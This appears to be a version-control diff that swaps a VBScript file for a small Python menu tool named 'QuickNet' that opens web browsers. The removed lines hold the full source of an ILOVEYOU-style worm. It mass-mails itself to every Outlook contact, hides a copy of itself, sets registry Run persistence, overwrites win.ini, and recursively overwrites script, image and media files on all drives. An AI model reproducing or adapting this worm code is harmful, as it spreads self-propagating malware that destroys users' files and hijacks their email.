@@ -1,94 +1,88 @@
-On Error Resume Next
+import pyfiglet
+from colorama import init, Fore, Style
+import webbrowser
+import subprocess
+import sys
 
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set wshell = CreateObject("WScript.Shell")
+if sys.platform == "win32":
+    import winreg
 
-Set thisFile = fso.OpenTextFile(WScript.ScriptFullName, 1)
-wormCode = thisFile.ReadAll
-thisFile.Close
+def get_default_browser_name():
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice") as key:
+            prog_id, _ = winreg.QueryValueEx(key, "ProgId")
+            if "ChromeHTML" in prog_id:
+                return "Google Chrome"
+            elif "FirefoxURL" in prog_id:
+                return "Mozilla Firefox"
+            elif "MSEdgeHTM" in prog_id:
+                return "Microsoft Edge"
+            elif "IE.HTTP" in prog_id:
+                return "Internet Explorer"
+            else:
+                return prog_id
+    except Exception:
+        return "Unknown"
 
-Set outlook = Nothing
-On Error Resume Next
-Set outlook = CreateObject("Outlook.Application")
-On Error GoTo 0
+def open_default_browser(url="https://www.google.com"):
+    if not (url.startswith("http://") or url.startswith("https://")):
+        url = "http://" + url
+    webbrowser.open(url)
 
-If Not outlook Is Nothing Then
-    Set mapi = outlook.GetNameSpace("MAPI")
-    For i = 1 To mapi.AddressLists.Count
-        Set addressList = mapi.AddressLists(i)
-        If addressList.AddressEntries.Count > 0 Then
-            For j = 1 To addressList.AddressEntries.Count
-                Set entry = addressList.AddressEntries(j)
-                email = entry.Address
-                If InStr(email, "@") Then
-                    Set mail = outlook.CreateItem(0)
-                    mail.To = email
-                    mail.Subject = "ILOVEYOU"
-                    mail.Body = "kindly check the attached LOVELETTER coming from me."
-                    mail.Attachments.Add WScript.ScriptFullName
-                    mail.Send
-                End If
-            Next
-        End If
-    Next
-End If
+def open_edge(url=None):
+    if sys.platform != "win32":
+        return
+    try:
+        if url:
+            subprocess.Popen(["msedge.exe", url])
+        else:
+            subprocess.Popen(["msedge.exe"])
+    except FileNotFoundError:
+        edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+        try:
+            if url:
+                subprocess.Popen([edge_path, url])
+            else:
+                subprocess.Popen([edge_path])
+        except Exception:
+            pass
 
-systemFolder = wshell.ExpandEnvironmentStrings("%SystemRoot%") & "\System\"
-wormCopyPath = systemFolder & "LOVE-LETTER-FOR-YOU.TXT.vbs"
-If Not fso.FileExists(wormCopyPath) Then
-    fso.CopyFile WScript.ScriptFullName, wormCopyPath
-    Const Hidden = 2
-    Const SystemAttr = 4
-    fso.GetFile(wormCopyPath).Attributes = Hidden + SystemAttr
-End If
+init()
 
-regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\LOVELETTER"
-wshell.RegWrite regPath, wormCopyPath, "REG_SZ"
+ascii_art = pyfiglet.figlet_format("QuickNet", font="slant")
+print(Fore.GREEN + ascii_art + Style.RESET_ALL)
 
-winIniPath = wshell.ExpandEnvironmentStrings("%SystemRoot%") & "\win.ini"
-If fso.FileExists(winIniPath) Then
-    On Error Resume Next
-    Set winIniFile = fso.OpenTextFile(winIniPath, 2, True)
-    winIniFile.Write wormCode
-    winIniFile.Close
-    On Error GoTo 0
-End If
+print(Fore.RED + " --- \\\\ Input NetTools for a list of tools /// ---" + Style.RESET_ALL)
 
-infectExts = Array("vbs", "vbe", "js", "jse", "css", "wsh", "sct", "hta", "jpg", "jpeg", "mp2", "mp3", "mpg", "mpeg", "mp4")
+while True:
+    user_input = input(Fore.GREEN + "Command: " + Style.RESET_ALL).strip()
 
-Const Hidden = 2
-Const SystemAttr = 4
+    if user_input == "NetTools":
+        print(Fore.RED + " --- \\\\ Open Browser /// ---" + Style.RESET_ALL)
+        print(Fore.RED + " --- \\\\ View Current Browser --- ///" + Style.RESET_ALL)
+        print(Fore.RED + " --- \\\\ Open Edge /// ---" + Style.RESET_ALL)
+        print(Fore.RED + " --- \\\\ Open Link /// ---" + Style.RESET_ALL)
+        print(Fore.RED + " --- \\\\ Chrome Installation /// ---" + Style.RESET_ALL)
+    elif user_input == "Open Browser":
+        open_default_browser()
+    elif user_input == "View Current Browser":
+        browser_name = get_default_browser_name()
+        print(Fore.GREEN + browser_name + Style.RESET_ALL)
+    elif user_input == "Open Edge":
+        open_edge()
+    elif user_input == "Open Link":
+        link = input(Fore.GREEN + "Go To: " + Style.RESET_ALL).strip()
+        if link:
+            open_default_browser(link)
+    elif user_input == "Chrome Installation":
+        chrome_url = "https://www.google.com/chrome/"
+        open_edge(chrome_url)
+    elif user_input.lower() in ("exit", "quit"):
+        break
+    else:
+        print("Command not recognized.")
 
-Sub InfectFolder(path)
-    Dim folder, file, subFolder, ext, infected
-    Set folder = fso.GetFolder(path)
-    For Each file In folder.Files
-        ext = LCase(fso.GetExtensionName(file.Name))
-        For Each e In infectExts
-            If ext = e Then
-                Set infected = fso.OpenTextFile(file.Path, 2, True)
-                infected.Write wormCode
-                infected.Close
-                On Error Resume Next
-                fso.GetFile(file.Path).Attributes = Hidden + SystemAttr
-                On Error GoTo 0
-                Exit For
-            End If
-        Next
-    Next
-    For Each subFolder In folder.SubFolders
-        InfectFolder subFolder.Path
-    Next
-End Sub
+input("\nPress Enter to exit...")
 
-Sub Sleep(milliseconds)
-    WScript.Sleep milliseconds
-End Sub
 
-Set drives = fso.Drives
-For Each d In drives
-    If d.DriveType = 2 Or d.DriveType = 3 Then
-        InfectFolder d.Path
-        Sleep 500
-    End If
-Next
